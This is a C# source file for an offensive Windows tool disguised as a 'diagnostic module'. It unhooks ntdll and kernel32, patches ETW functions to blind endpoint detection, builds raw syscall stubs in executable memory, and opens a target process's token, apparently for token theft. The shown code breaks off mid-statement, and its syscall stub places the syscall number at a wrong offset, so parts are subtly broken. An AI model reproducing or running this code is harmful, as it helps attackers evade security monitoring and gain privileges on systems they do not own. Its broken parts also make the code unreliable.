using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Collections.Generic;
using System.IO;

internal static class Program
{
    #region Native Strukturen & Delegates

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;

        public static OBJECT_ATTRIBUTES Create()
        {
            return new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES))
            };
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_MANDATORY_LABEL
    {
        public LUID_AND_ATTRIBUTES Label;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CURDIR
    {
        public UNICODE_STRING DosPath;
        public IntPtr Handle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct RTL_USER_PROCESS_PARAMETERS
    {
        public uint Length;
        public uint MaximumLength;
        public uint Flags;
        public uint DebugFlags;
        public IntPtr ConsoleHandle;
        public uint ConsoleFlags;
        public IntPtr StandardInput;
        public IntPtr StandardOutput;
        public IntPtr StandardError;
        public CURDIR CurrentDirectory;
        public UNICODE_STRING DllPath;
        public UNICODE_STRING ImagePathName;
        public UNICODE_STRING CommandLine;
        public IntPtr Environment;
        public uint StartingX;
        public uint StartingY;
        public uint CountX;
        public uint CountY;
        public uint CountCharsX;
        public uint CountCharsY;
        public uint FillAttribute;
        public uint WindowFlags;
        public uint ShowWindowFlags;
        public UNICODE_STRING WindowTitle;
        public UNICODE_STRING DesktopInfo;
        public UNICODE_STRING ShellInfo;
        public UNICODE_STRING RuntimeData;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_QUALITY_OF_SERVICE
    {
        public uint Length;
        public int ImpersonationLevel;
        public byte ContextTrackingMode;
        public bool EffectiveOnly;
    }

    // Delegates für Indirect Syscalls
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtOpenProcess(ref IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtDuplicateToken(IntPtr ExistingTokenHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, bool EffectiveOnly, int TokenType, out IntPtr NewTokenHandle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtClose(IntPtr Handle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtQueryInformationToken(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtSetInformationToken(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref ulong RegionSize, uint AllocationType, uint Protect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref ulong RegionSize, uint FreeType);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref ulong RegionSize, uint NewProtect, out uint OldProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, out int ReturnLength);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtCreateUserProcess(ref IntPtr ProcessHandle, ref IntPtr ThreadHandle, uint DesiredAccess, uint ThreadDesiredAccess, ref OBJECT_ATTRIBUTES ProcessAttributes, ref OBJECT_ATTRIBUTES ThreadAttributes, uint ProcessFlags, uint ThreadFlags, IntPtr ProcessParameters, IntPtr CreateInfo, IntPtr AttributeList);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtFlushInstructionCache(IntPtr ProcessHandle, IntPtr BaseAddress, uint RegionSize);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint RtlCreateProcessParametersEx(out IntPtr pProcessParameters, UNICODE_STRING ImagePathName, UNICODE_STRING DllPath, UNICODE_STRING CurrentDirectory, UNICODE_STRING CommandLine, IntPtr Environment, UNICODE_STRING WindowTitle, UNICODE_STRING DesktopInfo, UNICODE_STRING ShellInfo, UNICODE_STRING RuntimeData, uint Flags);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint RtlDestroyProcessParameters(IntPtr ProcessParameters);

    #endregion

    #region EDR Silencing & Unhooking (ntdll.dll + kernel32.dll)

    private static class EDRAntiAnalysis
    {
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint MEM_RELEASE = 0x8000;

        private static NtAllocateVirtualMemory _NtAllocateVirtualMemory;
        private static NtFreeVirtualMemory _NtFreeVirtualMemory;
        private static NtProtectVirtualMemory _NtProtectVirtualMemory;
        private static NtClose _NtClose;
        private static NtQuerySystemInformation _NtQuerySystemInformation;
        private static NtFlushInstructionCache _NtFlushInstructionCache;

        public static void InitializeSyscallsForSilencing()
        {
            _NtAllocateVirtualMemory = SyscallAPI.GetSyscall<NtAllocateVirtualMemory>("NtAllocateVirtualMemory");
            _NtFreeVirtualMemory = SyscallAPI.GetSyscall<NtFreeVirtualMemory>("NtFreeVirtualMemory");
            _NtProtectVirtualMemory = SyscallAPI.GetSyscall<NtProtectVirtualMemory>("NtProtectVirtualMemory");
            _NtClose = SyscallAPI.GetSyscall<NtClose>("NtClose");
            _NtQuerySystemInformation = SyscallAPI.GetSyscall<NtQuerySystemInformation>("NtQuerySystemInformation");
            _NtFlushInstructionCache = SyscallAPI.GetSyscall<NtFlushInstructionCache>("NtFlushInstructionCache");
        }

        private static IntPtr GetCurrentProcessHandle() => (IntPtr)(-1); // NtCurrentProcess()

        private static IntPtr GetModuleBaseAddressSyscall(string moduleName)
        {
            // Fallback: Process.GetCurrentProcess().Modules (für PoC ausreichend)
            try
            {
                foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
                {
                    if (module.ModuleName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
                        return module.BaseAddress;
                }
            }
            catch { }
            return IntPtr.Zero;
        }

        private static IntPtr GetFunctionAddressSyscall(IntPtr moduleBase, string functionName)
        {
            try
            {
                int e_lfanew = Marshal.ReadInt32(moduleBase, 0x3C);
                int exportRVA = Marshal.ReadInt32(moduleBase, e_lfanew + 0x88);
                if (exportRVA == 0) return IntPtr.Zero;

                IntPtr exportDir = (IntPtr)((long)moduleBase + exportRVA);
                int numberOfNames = Marshal.ReadInt32(exportDir, 0x18);
                IntPtr namesRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x20));
                IntPtr ordinalsRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x24));
                IntPtr functionsRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x1C));

                for (int i = 0; i < numberOfNames; i++)
                {
                    IntPtr nameRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(namesRVA, i * 4));
                    string name = Marshal.PtrToStringAnsi(nameRVA);
                    if (name == functionName)
                    {
                        short ordinal = Marshal.ReadInt16(ordinalsRVA, i * 2);
                        int functionRVA = Marshal.ReadInt32(functionsRVA, ordinal * 4);
                        return (IntPtr)((long)moduleBase + functionRVA);
                    }
                }
            }
            catch { }
            return IntPtr.Zero;
        }

        private static bool OverwriteTextSectionSyscall(IntPtr targetModule, IntPtr sourceModule)
        {
            try
            {
                int e_lfanew = Marshal.ReadInt32(targetModule, 0x3C);
                short numberOfSections = Marshal.ReadInt16(targetModule, e_lfanew + 0x06);
                int sizeOfOptionalHeader = Marshal.ReadInt16(targetModule, e_lfanew + 0x14);
                IntPtr sectionHeaderPtr = (IntPtr)((long)targetModule + e_lfanew + 0x18 + sizeOfOptionalHeader);

                for (int i = 0; i < numberOfSections; i++)
                {
                    string sectionName = Marshal.PtrToStringAnsi(sectionHeaderPtr);
                    if (sectionName == ".text")
                    {
                        int virtualAddress = Marshal.ReadInt32(sectionHeaderPtr, 0x0C);
                        int sizeOfRawData = Marshal.ReadInt32(sectionHeaderPtr, 0x10);
                        IntPtr targetAddr = (IntPtr)((long)targetModule + virtualAddress);

                        byte[] cleanBytes = new byte[sizeOfRawData];
                        Marshal.Copy((IntPtr)((long)sourceModule + virtualAddress), cleanBytes, 0, sizeOfRawData);

                        ulong regionSize = (ulong)sizeOfRawData;
                        IntPtr baseAddr = targetAddr;
                        _NtProtectVirtualMemory(GetCurrentProcessHandle(), ref baseAddr, ref regionSize, PAGE_EXECUTE_READWRITE, out uint oldProtect);
                        Marshal.Copy(cleanBytes, 0, targetAddr, sizeOfRawData);
                        _NtProtectVirtualMemory(GetCurrentProcessHandle(), ref baseAddr, ref regionSize, oldProtect, out oldProtect);
                        _NtFlushInstructionCache(GetCurrentProcessHandle(), targetAddr, (uint)sizeOfRawData);
                        return true;
                    }
                    sectionHeaderPtr = (IntPtr)((long)sectionHeaderPtr + 40);
                }
            }
            catch { }
            return false;
        }

        public static bool UnhookModule(string moduleName)
        {
            try
            {
                string systemPath = Environment.SystemDirectory;
                string cleanDllPath = Path.Combine(systemPath, moduleName);

                IntPtr loadedModule = GetModuleBaseAddressSyscall(moduleName);
                if (loadedModule == IntPtr.Zero) return false;

                // LoadLibrary muss als Win32 API bleiben (kann nicht per Syscall geladen werden)
                IntPtr cleanModule = LoadLibraryWin32(cleanDllPath);
                if (cleanModule == IntPtr.Zero) return false;

                bool result = OverwriteTextSectionSyscall(loadedModule, cleanModule);
                FreeLibraryWin32(cleanModule);
                return result;
            }
            catch
            {
                return false;
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool FreeLibrary(IntPtr hModule);

        private static IntPtr LoadLibraryWin32(string path) => LoadLibrary(path);
        private static void FreeLibraryWin32(IntPtr module) => FreeLibrary(module);

        public static bool DisableEtwSyscall()
        {
            try
            {
                IntPtr ntdll = GetModuleBaseAddressSyscall("ntdll.dll");
                if (ntdll == IntPtr.Zero) return false;

                string[] etwFunctions = { "EtwEventWrite", "EtwEventRegister", "EtwEventWriteFull", "EtwEventWriteTransfer" };
                byte[] retPatch = { 0xC3 };
                byte[] xorRetPatch = { 0x48, 0x33, 0xC0, 0xC3 };

                foreach (string func in etwFunctions)
                {
                    IntPtr funcAddr = GetFunctionAddressSyscall(ntdll, func);
                    if (funcAddr != IntPtr.Zero)
                    {
                        ulong regionSize = (ulong)retPatch.Length;
                        IntPtr baseAddr = funcAddr;
                        _NtProtectVirtualMemory(GetCurrentProcessHandle(), ref baseAddr, ref regionSize, PAGE_EXECUTE_READWRITE, out uint oldProtect);

                        if (func == "EtwEventWrite" || func == "EtwEventWriteTransfer")
                            Marshal.Copy(xorRetPatch, 0, funcAddr, xorRetPatch.Length);
                        else
                            Marshal.Copy(retPatch, 0, funcAddr, retPatch.Length);

                        _NtProtectVirtualMemory(GetCurrentProcessHandle(), ref baseAddr, ref regionSize, oldProtect, out oldProtect);
                        _NtFlushInstructionCache(GetCurrentProcessHandle(), funcAddr, (uint)retPatch.Length);
                    }
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static void SilenceEDR()
        {
            Console.WriteLine("[*] Starting EDR Silencing...");
            InitializeSyscallsForSilencing();

            if (UnhookModule("ntdll.dll"))
                Console.WriteLine("[+] ntdll.dll unhooked");
            else
                Console.WriteLine("[-] ntdll.dll unhooking failed");

            if (UnhookModule("kernel32.dll"))
                Console.WriteLine("[+] kernel32.dll unhooked");
            else
                Console.WriteLine("[-] kernel32.dll unhooking failed");

            if (DisableEtwSyscall())
                Console.WriteLine("[+] ETW disabled via syscall");
            else
                Console.WriteLine("[-] ETW disabling failed");

            Console.WriteLine("[*] EDR Silencing complete");
        }
    }

    #endregion

    #region Dynamische API-Resolve für alle Syscalls

    private static class SyscallAPI
    {
        private static Dictionary<string, Delegate> syscallCache = new Dictionary<string, Delegate>();

        public static IntPtr GetModuleBase(string moduleName)
        {
            try
            {
                foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
                {
                    if (module.ModuleName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
                        return module.BaseAddress;
                }
            }
            catch { }
            return IntPtr.Zero;
        }

        public static IntPtr GetFunctionAddress(IntPtr moduleBase, string functionName)
        {
            try
            {
                int e_lfanew = Marshal.ReadInt32(moduleBase, 0x3C);
                int exportRVA = Marshal.ReadInt32(moduleBase, e_lfanew + 0x88);
                if (exportRVA == 0) return IntPtr.Zero;

                IntPtr exportDir = (IntPtr)((long)moduleBase + exportRVA);
                int numberOfNames = Marshal.ReadInt32(exportDir, 0x18);
                IntPtr namesRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x20));
                IntPtr ordinalsRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x24));
                IntPtr functionsRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x1C));

                for (int i = 0; i < numberOfNames; i++)
                {
                    IntPtr nameRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(namesRVA, i * 4));
                    string name = Marshal.PtrToStringAnsi(nameRVA);
                    if (name == functionName)
                    {
                        short ordinal = Marshal.ReadInt16(ordinalsRVA, i * 2);
                        int functionRVA = Marshal.ReadInt32(functionsRVA, ordinal * 4);
                        return (IntPtr)((long)moduleBase + functionRVA);
                    }
                }
            }
            catch { }
            return IntPtr.Zero;
        }

        public static uint ExtractSSN(IntPtr functionPtr)
        {
            try
            {
                byte[] stub = new byte[32];
                Marshal.Copy(functionPtr, stub, 0, 32);

                for (int i = 0; i < 28; i++)
                {
                    if (stub[i] == 0xB8)
                    {
                        return BitConverter.ToUInt32(stub, i + 1);
                    }
                }
                return (uint)Marshal.ReadInt32(functionPtr, 4);
            }
            catch
            {
                return 0;
            }
        }

        public static byte[] CreateSyscallStub(uint ssn)
        {
            byte[] stub = new byte[]
            {
                0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, // mov rax, [gs:0x60]
                0x48, 0x8B, 0x40, 0x18,                               // mov rax, [rax+0x18]
                0x48, 0x8B, 0x40, 0x20,                               // mov rax, [rax+0x20]
                0x48, 0x8B, 0x40, 0x20,                               // mov rax, [rax+0x20]
                0x48, 0x8B, 0x08,                                     // mov rcx, [rax]
                0x48, 0x8B, 0x09,                                     // mov rcx, [rcx]
                0x48, 0x8B, 0x01,                                     // mov rax, [rcx]
                0x4C, 0x8B, 0xD1,                                     // mov r10, rcx
                0xB8, 0x00, 0x00, 0x00, 0x00,                         // mov eax, ssn
                0x0F, 0x05,                                           // syscall
                0xC3                                                  // ret
            };
            byte[] ssnBytes = BitConverter.GetBytes(ssn);
            Buffer.BlockCopy(ssnBytes, 0, stub, 24, 4);
            return stub;
        }

        public static T GetSyscall<T>(string functionName) where T : class
        {
            string key = functionName;
            if (syscallCache.ContainsKey(key))
                return syscallCache[key] as T;

            IntPtr ntdll = GetModuleBase("ntdll.dll");
            if (ntdll == IntPtr.Zero) return null;

            IntPtr funcAddr = GetFunctionAddress(ntdll, functionName);
            if (funcAddr == IntPtr.Zero) return null;

            uint ssn = ExtractSSN(funcAddr);
            if (ssn == 0) return null;

            byte[] stub = CreateSyscallStub(ssn);

            // NtAllocateVirtualMemory für Speicherreservierung
            var ntAlloc = GetSyscall<NtAllocateVirtualMemory>("NtAllocateVirtualMemory");
            if (ntAlloc != null)
            {
                IntPtr baseAddr = IntPtr.Zero;
                ulong size = (ulong)stub.Length;
                uint status = ntAlloc((IntPtr)(-1), ref baseAddr, IntPtr.Zero, ref size, 0x1000 | 0x2000, 0x40);
                if (status == 0 && baseAddr != IntPtr.Zero)
                {
                    Marshal.Copy(stub, 0, baseAddr, stub.Length);
                    T del = Marshal.GetDelegateForFunctionPointer<T>(baseAddr);
                    syscallCache[key] = del as Delegate;
                    return del;
                }
            }

            return null;
        }
    }

    #endregion

    #region Token Information Classes (für NtQueryInformationToken)

    private enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups = 2,
        TokenPrivileges = 3,
        TokenOwner = 4,
        TokenPrimaryGroup = 5,
        TokenDefaultDacl = 6,
        TokenSource = 7,
        TokenType = 8,
        TokenImpersonationLevel = 9,
        TokenStatistics = 10,
        TokenRestrictedSids = 11,
        TokenSessionId = 12,
        TokenGroupsAndPrivileges = 13,
        TokenSessionReference = 14,
        TokenSandBoxInert = 15,
        TokenAuditPolicy = 16,
        TokenOrigin = 17,
        TokenElevationType = 18,
        TokenLinkedToken = 19,
        TokenElevation = 20,
        TokenHasRestrictions = 21,
        TokenAccessInformation = 22,
        TokenVirtualizationAllowed = 23,
        TokenVirtualizationEnabled = 24,
        TokenIntegrityLevel = 25,
        TokenUIAccess = 26,
        TokenMandatoryPolicy = 27,
        TokenLogonSid = 28,
        TokenIsAppContainer = 29,
        TokenCapabilities = 30,
        TokenAppContainerSid = 31,
        TokenAppContainerNumber = 32,
        TokenUserClaimAttributes = 33,
        TokenDeviceClaimAttributes = 34,
        TokenRestrictedUserClaimAttributes = 35,
        TokenRestrictedDeviceClaimAttributes = 36,
        TokenDeviceGroups = 37,
        TokenRestrictedDeviceGroups = 38,
        TokenSecurityAttributes = 39,
        TokenIsRestricted = 40,
        TokenProcessTrustLevel = 41,
        TokenPrivateNameSpace = 42,
        TokenSingletonAttributes = 43,
        TokenBnoIsolation = 44,
        TokenChildProcessFlags = 45,
        TokenIsLessPrivilegedAppContainer = 46,
        TokenIsSandboxed = 47,
        TokenIsAppSilo = 48,
        MaxTokenInfoClass = 49
    }

    private enum TOKEN_TYPE
    {
        TokenPrimary = 1,
        TokenImpersonation
    }

    private enum SECURITY_IMPERSONATION_LEVEL
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    #endregion

    #region Token-Informationen via NtQueryInformationToken (keine advapi32!)

    private static NtQueryInformationToken _NtQueryInformationToken;

    private static void InitializeTokenSyscalls()
    {
        _NtQueryInformationToken = SyscallAPI.GetSyscall<NtQueryInformationToken>("NtQueryInformationToken");
    }

    private static uint GetTokenIntegrityLevel(IntPtr hToken)
    {
        if (_NtQueryInformationToken == null) return 0;

        uint dwLen = 0;
        _NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, IntPtr.Zero, 0, out dwLen);
        if (dwLen > 0)
        {
            IntPtr pTIL = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                if (_NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pTIL, dwLen, out dwLen) == 0)
                {
                    IntPtr pSid = Marshal.ReadIntPtr(pTIL);
                    IntPtr pCount = GetSidSubAuthorityCountNative(pSid);
                    if (pCount != IntPtr.Zero)
                    {
                        byte count = Marshal.ReadByte(pCount);
                        IntPtr pLevel = GetSidSubAuthorityNative(pSid, (uint)(count - 1));
                        if (pLevel != IntPtr.Zero)
                            return (uint)Marshal.ReadInt32(pLevel);
                    }
                }
            }
            finally
            {
                Marshal.FreeHGlobal(pTIL);
            }
        }
        return 0;
    }

    private static uint GetTokenElevationType(IntPtr hToken)
    {
        if (_NtQueryInformationToken == null) return 0;

        uint dwLen = 0;
        _NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevationType, IntPtr.Zero, 0, out dwLen);
        if (dwLen > 0)
        {
            IntPtr pElevType = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                if (_NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevationType, pElevType, dwLen, out dwLen) == 0)
                {
                    return (uint)Marshal.ReadInt32(pElevType);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(pElevType);
            }
        }
        return 0;
    }

    private static int GetTokenSessionId(IntPtr hToken)
    {
        if (_NtQueryInformationToken == null) return -1;

        uint dwLen = 0;
        _NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenSessionId, IntPtr.Zero, 0, out dwLen);
        if (dwLen > 0)
        {
            IntPtr pSessionId = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                if (_NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenSessionId, pSessionId, dwLen, out dwLen) == 0)
                {
                    return Marshal.ReadInt32(pSessionId);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(pSessionId);
            }
        }
        return -1;
    }

    private static bool IsTokenElevated(IntPtr hToken)
    {
        if (_NtQueryInformationToken == null) return false;

        uint dwLen = 0;
        _NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevation, IntPtr.Zero, 0, out dwLen);
        if (dwLen > 0)
        {
            IntPtr pElev = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                if (_NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevation, pElev, dwLen, out dwLen) == 0)
                {
                    return Marshal.ReadInt32(pElev) != 0;
                }
            }
            finally
            {
                Marshal.FreeHGlobal(pElev);
            }
        }
        return false;
    }

    // Diese Hilfsfunktionen sind reine Speicher-Leser, keine APIs
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);

    private static IntPtr GetSidSubAuthorityCountNative(IntPtr pSid) => GetSidSubAuthorityCount(pSid);
    private static IntPtr GetSidSubAuthorityNative(IntPtr pSid, uint n) => GetSidSubAuthority(pSid, n);

    #endregion

    #region RtlCreateProcessParametersEx Helper

    private static IntPtr CreateProcessParameters(string imagePath, string commandLine)
    {
        var _RtlCreateProcessParametersEx = SyscallAPI.GetSyscall<RtlCreateProcessParametersEx>("RtlCreateProcessParametersEx");
        if (_RtlCreateProcessParametersEx == null) return IntPtr.Zero;

        UNICODE_STRING imagePathStr = new UNICODE_STRING();
        UNICODE_STRING commandLineStr = new UNICODE_STRING();

        byte[] imagePathBytes = Encoding.Unicode.GetBytes(imagePath + "\0");
        byte[] commandLineBytes = Encoding.Unicode.GetBytes(commandLine + "\0");

        imagePathStr.Buffer = Marshal.AllocHGlobal(imagePathBytes.Length);
        Marshal.Copy(imagePathBytes, 0, imagePathStr.Buffer, imagePathBytes.Length);
        imagePathStr.Length = (ushort)(imagePathBytes.Length - 2);
        imagePathStr.MaximumLength = (ushort)imagePathBytes.Length;

        commandLineStr.Buffer = Marshal.AllocHGlobal(commandLineBytes.Length);
        Marshal.Copy(commandLineBytes, 0, commandLineStr.Buffer, commandLineBytes.Length);
        commandLineStr.Length = (ushort)(commandLineBytes.Length - 2);
        commandLineStr.MaximumLength = (ushort)commandLineBytes.Length;

        uint status = _RtlCreateProcessParametersEx(out IntPtr pParams, imagePathStr, new UNICODE_STRING(), new UNICODE_STRING(), commandLineStr, IntPtr.Zero, new UNICODE_STRING(), new UNICODE_STRING(), new UNICODE_STRING(), new UNICODE_STRING(), 0x20);

        Marshal.FreeHGlobal(imagePathStr.Buffer);
        Marshal.FreeHGlobal(commandLineStr.Buffer);

        return status == 0 ? pParams : IntPtr.Zero;
    }

    #endregion

    #region Main mit vollständigen Indirect Syscalls

    public static void Main()
    {
        Console.WriteLine("[*] Advanced Diagnostic Module v11.0 - Full Indirect Syscall Version");
        Console.WriteLine("[*] ntdll.dll & kernel32.dll unhooked, ETW disabled");
        Console.WriteLine("[*] ALL APIs via Indirect Syscalls (no hooks)");

        // EDR Silencing vor allen anderen Aktionen
        EDRAntiAnalysis.SilenceEDR();

        // NtQueryInformationToken initialisieren
        InitializeTokenSyscalls();

        // Aktuelle Prozess-Identität (WindowsIdentity.GetCurrent bleibt als einzige .NET API)
        var currentIdentity = WindowsIdentity.GetCurrent();
        bool isAdmin = new WindowsPrincipal(currentIdentity).IsInRole(WindowsBuiltInRole.Administrator);
        Console.WriteLine($"[*] Admin: {isAdmin}");
        Console.WriteLine($"[*] Current Session: {GetTokenSessionId(currentIdentity.Token)}");

        Console.Write("[*] Target PID: ");
        if (!uint.TryParse(Console.ReadLine(), out uint pid))
        {
            Console.WriteLine("[-] Ungültige PID");
            return;
        }

        try
        {
            // Syscall Delegates laden
            var _NtOpenProcess = SyscallAPI.GetSyscall<NtOpenProcess>("NtOpenProcess");
            var _NtOpenProcessToken = SyscallAPI.GetSyscall<NtOpenProcessToken>("NtOpenProcessToken");
            var _NtDuplicateToken = SyscallAPI.GetSyscall<NtDuplicateToken>("NtDuplicateToken");
            var _NtClose = SyscallAPI.GetSyscall<NtClose>("NtClose");
            var _NtSetInformationToken = SyscallAPI.GetSyscall<NtSetInformationToken>("NtSetInformationToken");

            if (_NtOpenProcess == null || _NtOpenProcessToken == null || _NtDuplicateToken == null || _NtClose == null)
            {
                Console.WriteLine("[-] Failed to load syscall delegates");
                return;
            }

            Console.WriteLine("[+] Syscall delegates loaded");

            // 1. Zielprozess öffnen mit NtOpenProcess (Indirect Syscall)
            OBJECT_ATTRIBUTES objAttr = OBJECT_ATTRIBUTES.Create();
            CLIENT_ID clientId = new CLIENT_ID();
            clientId.UniqueProcess = (IntPtr)pid;
            clientId.UniqueThread = IntPtr.Zero;

            uint desiredAccess = 0x1000; // PROCESS_QUERY_LIMITED_INFORMATION
            if (isAdmin) desiredAccess |= 0x0400; // PROCESS_QUERY_INFORMATION

            IntPtr hProcess = IntPtr.Zero;
            uint status = _NtOpenProcess(ref hProcess, desiredAccess, ref objAttr, ref clientId);

            if (status != 0 || hProcess == IntPtr.Zero)
            {
                // Fallback: PROCESS_DUP_HANDLE
                desiredAccess = 0x0040;
                status = _NtOpenProcess(ref hProcess, desiredAccess, ref objAttr, ref clientId);
                if (status != 0 || hProcess == IntPtr.Zero)
                {
                    Console.WriteLine($"[-] NtOpenProcess failed: 0x{status:X8}");
                    return;
                }
            }
            Console.WriteLine($"[+] Process opened via NtOpenProcess (handle: 0x{hProcess.ToInt64():X})");

            // 2. Token aus Zielprozess mit NtOpenProcessToken
            status = _NtOpenProcessToken(hProcess, 0xF01FF, out IntPtr hTargetToken);
            if (status != 0 || hTargetToken == IntPtr.Zero)
            {
                Console.WriteLine($"[-] NtOpenProcessToken failed: 0x{status:X8}");
                _NtClose(hProcess);
                return;
            }
            Console.WriteLine("[+] Token opened via NtOpenProcessToken");

            // 3. Token-Elevation prüfen (via NtQueryInformationToken)
            bool isTargetElevated = IsTokenElevated(hTargetToken);
            uint targetIntegrity = GetTokenIntegrityLevel(hTargetToken);
            int targetSession = GetTokenSessionId(hTargetToken);
            uint targetElevationType = GetTokenElevationType(hTargetToken);

            Console.WriteLine($"[+] Target Token Info:");
            Console.WriteLine($"    - Elevated: {isTargetElevated}");
            Console.WriteLine($"    - Integrity Level: 0x{targetIntegrity:X}");
            Console.WriteLine($"    - Session ID: {targetSession}");
            Console.WriteLine($"    - Elevation Type: {targetElevationType}");

            // Prüfen ob sich der Aufwand lohnt
            uint currentIntegrity = GetTokenIntegrityLevel(currentIdentity.Token);
            if (targetIntegrity <= currentIntegrity && !isTargetElevated)
            {
                Console.WriteLine("[!] Target token has lower or equal privileges - no benefit");
                Console.Write("[*] Continue anyway? (y/N): ");
